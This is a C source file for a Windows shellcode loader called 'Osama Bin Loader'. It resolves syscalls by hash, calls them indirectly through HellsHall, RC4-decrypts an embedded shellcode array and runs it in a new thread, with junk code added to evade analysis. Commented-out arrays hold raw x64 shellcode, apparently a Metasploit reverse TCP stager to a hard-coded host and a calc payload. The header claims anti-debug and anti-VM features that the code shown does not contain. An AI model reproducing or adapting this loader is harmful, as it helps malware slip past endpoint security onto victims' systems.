#include <Windows.h>
#include <stdio.h>
#include "HellsHall.h"



// OSAMA BIN LOADER FUNCTIONALITIES:
//	1) INDIRECT SYSCALLS			
//	2) custom GetProcAddress e GetModuleHandle
//	3) compile time API hashing
//	4) IAT camouflage (inserting unused windows API functions)
//	5) RC4 encryption via SystemFunction032
//  6) anti-debugging techniques
//	7) anti-vm techniques
//


#define NtAllocateVirtualMemory_CRC32b	0xE0762FEB
#define NtProtectVirtualMemory_CRC32b	0x5C2D1A97
#define NtCreateThreadEx_CRC32b			0x2073465A

/*
	printf("#define NtAllocateVirtualMemory_CRC32b 0x%0.8X \n", HASH("NtAllocateVirtualMemory"));
	printf("#define NtProtectVirtualMemory_CRC32b 0x%0.8X \n", HASH("NtProtectVirtualMemory"));
	printf("#define NtCreateThreadEx_CRC32b 0x%0.8X \n", HASH("NtCreateThreadEx"));
*/


typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS STATUS = NULL;

	USTRING Data = {
		.Buffer = pPayloadData,
		.Length = sPayloadSize,
		.MaximumLength = sPayloadSize
	};

	USTRING	Key = {
		.Buffer = pRc4Key,
		.Length = dwRc4KeySize,
		.MaximumLength = dwRc4KeySize
	};

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

unsigned char rawData[] = { 0xfc, 0xe9, 0x62, 0xa4, 0xd9, 0x37, 0x8a, 0x71, 0x31, 0x89, 0xec, 0xc5, 0xed, 0xce, 0xf7, 0xcb, 0x9f, 0x2a, 0xbe, 0x64, 0x9d, 0xed, 0x9f, 0xec, 0x16, 0xf0, 0x46, 0xbe, 0xfc, 0x83, 0xd7, 0x07, 0x79, 0x9a, 0x98, 0x02, 0x56, 0x4c, 0x29, 0x5b, 0xc5, 0xb4, 0x53, 0xb5, 0x7a, 0x4a, 0xbc, 0x3b, 0xf9, 0xf5, 0x1b, 0x27, 0x6a, 0xab, 0xfe, 0xc1, 0x50, 0xac, 0x72, 0x35, 0xcd, 0xc8, 0xab, 0x3f, 0x0c, 0x62, 0x5c, 0xe8, 0x20, 0x67, 0x43, 0x98, 0x02, 0x7e, 0x2d, 0x28, 0xee, 0x98, 0x14, 0x02, 0x80, 0xf7, 0xf8, 0x27, 0x06, 0xac, 0xf7, 0xa8, 0xed, 0xe6, 0xc8, 0xe4, 0xee, 0x32, 0xf1, 0x50, 0xa9, 0x14, 0x4a, 0xc6, 0x16, 0x74, 0x78, 0x58, 0xf6, 0xf7, 0x34, 0xfa, 0x43, 0xe8, 0x98, 0x9e, 0x80, 0x87, 0x3d, 0x3d, 0x05, 0x2b, 0x86, 0xfa, 0x62, 0x85, 0xed, 0x20, 0x13, 0x76, 0x45, 0x79, 0xf2, 0x8d, 0x24, 0x58, 0x20, 0x60, 0x80, 0x40, 0x5a, 0x83, 0xdd, 0xb4, 0xb7, 0x38, 0x4d, 0x35, 0xf4, 0xfd, 0x45, 0xdd, 0x43, 0x39, 0xca, 0xd6, 0xba, 0x4c, 0x8d, 0xde, 0x2a, 0xb2, 0xcf, 0x30, 0x85, 0xcc, 0xe4, 0xf2, 0x9f, 0x4c, 0x97, 0xd0, 0xee, 0xaf, 0x92, 0xfd, 0x58, 0xda, 0x83, 0xbf, 0x68, 0xb1, 0x4c, 0x5a, 0xc0, 0xd1, 0x07, 0xe9, 0xd1, 0x85, 0x51, 0x17, 0x78, 0x15, 0x2c, 0x56, 0x1e, 0xf5, 0xd2, 0x80, 0x9e, 0x8a, 0xab, 0x89, 0x1b, 0xb8, 0x58, 0xd5, 0x6e, 0x9f, 0x12, 0xee, 0x84, 0x74, 0x6c, 0x6e, 0x10, 0x34, 0x19, 0x26, 0x27, 0xae, 0x49, 0xe0, 0xfc, 0xd1, 0x6c, 0x10, 0x46, 0x9b, 0xe0, 0x05, 0x11, 0x7a, 0xdb, 0x06, 0x69, 0x9f, 0xae, 0x46, 0xae, 0x8c, 0xbf, 0xfc, 0x7a, 0xc3, 0x00, 0xdf, 0xd0, 0x1a, 0xf2, 0xbb, 0xce, 0x08, 0x26, 0xa5, 0x06, 0x00, 0x5e, 0xc9, 0xcb, 0x3f, 0x2b, 0x9f, 0x57, 0x0c, 0xb1, 0xdb, 0xe2, 0xa4, 0x3d, 0xd0, 0x2a, 0xd0, 0xed, 0x53, 0x81, 0xfe, 0xab, 0xad, 0xb1, 0x3f, 0xeb, 0xd1, 0x92, 0x67, 0xc4, 0xd0, 0x70, 0x8e, 0x4e, 0xf7, 0x6f, 0x35, 0xd5, 0xe8, 0x1f, 0x10, 0xb7, 0x7e, 0xfb, 0x5d, 0x9d, 0x9f, 0x45, 0xa3, 0xb5, 0x32, 0x17, 0xe0, 0x8e, 0x61, 0x68, 0x20, 0x7e, 0x42, 0xc7, 0xe5, 0x66, 0xa8, 0x5b, 0x05, 0x5d, 0x76, 0x30, 0xd8, 0x58, 0xf4, 0xb0, 0xb7, 0xca, 0xb1, 0xde, 0xae, 0xe9, 0x06, 0xb7, 0x0a, 0xc4, 0x85, 0xdc, 0x9e, 0xa4, 0x7d, 0x51, 0x85, 0x7e, 0x1e, 0x47, 0x78, 0xf1, 0xd8, 0x39, 0x20, 0x5f, 0xd0, 0x79, 0x21, 0xe3, 0xcf, 0x9a, 0xe2, 0x15, 0x7e, 0x6b, 0xa3, 0xd3, 0x98, 0x2c, 0xb3, 0x05, 0xa9, 0xc8, 0x6a, 0x01, 0x78, 0xad, 0xa9, 0x38, 0xcc, 0x8e, 0xf8, 0xf4, 0x68, 0x88, 0xe4, 0x8c, 0x70, 0x7d, 0x2a, 0x7c, 0x41, 0x93, 0x08, 0x41, 0x82, 0x92, 0x06, 0xbe, 0xa1, 0xbb, 0xf0, 0x86, 0xd6, 0xf7, 0x5f, 0x28, 0x97, 0xc8, 0xd4, 0x70, 0x4d, 0xd9, 0xea, 0xfb, 0xb6, 0x16, 0x94, 0x35, 0x15, 0x45, 0x04, 0xd4, 0x13, 0x8c, 0xcc, 0x03, 0xa3, 0xca, 0x60, 0xed, 0x13, 0xd3, 0xf6, 0xff, 0xa3, 0x20, 0x33, 0x54, 0xea, 0xaa, 0xc8, 0xcb, 0xa8, 0xce, 0xeb, 0x6b, 0x49, 0xa7, 0xdd, 0xff, 0x5f, 0xee, 0xda, 0xfb, 0xc3, 0x27, 0x6a, 0xea, 0x3e, 0xdd, 0x5d, 0x06, 0x6b, 0x31, 0xe8, 0xf9, 0xa6, 0x14, 0xc7, 0x79, 0xa3, 0x57, 0xad, 0xd5, 0x37, 0xf7, 0x94, 0x3e, 0xce, 0x85, 0xa4, 0x46, 0xbd, 0x81, 0x88, 0xee, 0x48, 0xb5, 0x72, 0x58, 0x26, 0xe1, 0x8a, 0x8d, 0x91, 0x4e, 0xeb, 0xf0, 0x62, 0xf3, 0xb6, 0xc6, 0x77, 0x45, 0xdb, 0x26, 0x97, 0xca, 0x2d, 0x58, 0xd8, 0xe6, 0x7c, 0x3f };

//unsigned char rawData[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x56, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50, 0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xac, 0x19, 0xb9, 0xf1, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c, 0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x00 };

//// x64 metasploit calc
//unsigned char rawData[] = {
//	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
//	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
//	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
//	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
//	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
//	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
//	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
//	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
//	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
//	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
//	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
//	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
//	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
//	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
//	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
//	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
//	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
//	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
//	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
//	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
//	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
//	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
//	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
//};



typedef struct _MyStruct
{
	SysFunc NtAllocateVirtualMemory;
	SysFunc NtProtectVirtualMemory;
	SysFunc NtCreateThreadEx;

}MyStruct, * PMyStruct;


MyStruct S = { 0 };



/*

	to call `NtAllocateVirtualMemory` for example, we need a `SysFunc` structure that will hold information about the syscall
	we first call `InitilizeSysFunc` then get the syscall's information using `getSysFuncStruct`
	after that, when you want to call `NtAllocateVirtualMemory` u pass its `SysFunc` structure to the `SYSCALL` macro
	then call `HellHall` function, passing `NtAllocateVirtualMemory's` parameter

*/


BOOL Initialize() {

	RtlSecureZeroMemory(&S, sizeof(MyStruct));

	if (!InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtAllocateVirtualMemory);

	if (!InitilizeSysFunc(NtProtectVirtualMemory_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtProtectVirtualMemory);

	if (!InitilizeSysFunc(NtCreateThreadEx_CRC32b))
		return FALSE;
	getSysFuncStruct(&S.NtCreateThreadEx);

	return TRUE;
}




int main() {

	// insert some random junk code here
	int a = 3;
	int b = 10;
	int c = 5;
	int d = 0;

	a = a + 1;
	b = b + 2;
	b = a + 3;
	c = b + 4;
	d = c / 5;

	for (int i = 0; i < c; i++) {
		a = a + 1;
	}

	printf("[i] [HELL HALL] Press <Enter> To Run ... ");
	getchar();


	if (!Initialize())
		return -1;

	PVOID		pAddress = NULL;
	SIZE_T		dwSize = sizeof(rawData);
	DWORD		dwOld = NULL;
	HANDLE		hThread = NULL;
	NTSTATUS	STATUS = NULL;


	SYSCALL(S.NtAllocateVirtualMemory);
	if ((STATUS = HellHall((HANDLE)-1, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
		printf("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}

	printf("[+] [HELL HALL] pAddress : 0x%p \n", pAddress);

	unsigned char key[] = { 'u', 'n', 'b', 'r', 'e', 'a', 'k', 'a', 'b', 'l', 'e', '_', 'k', 'e', 'y' };

	Rc4EncryptionViaSystemFunc032(key, rawData, sizeof("unbreakable_key"), sizeof(rawData));



	memcpy(pAddress, rawData, sizeof(rawData));



	SYSCALL(S.NtProtectVirtualMemory);
	if ((STATUS = HellHall((HANDLE)-1, &pAddress, &dwSize, PAGE_EXECUTE_READ, &dwOld)) != 0x0) {
		printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}

	SYSCALL(S.NtCreateThreadEx);
	if ((STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
		printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}


	printf("[#] [HELL HALL] Press <Enter> To QUIT ... \n");
	getchar();
	return 0;
}
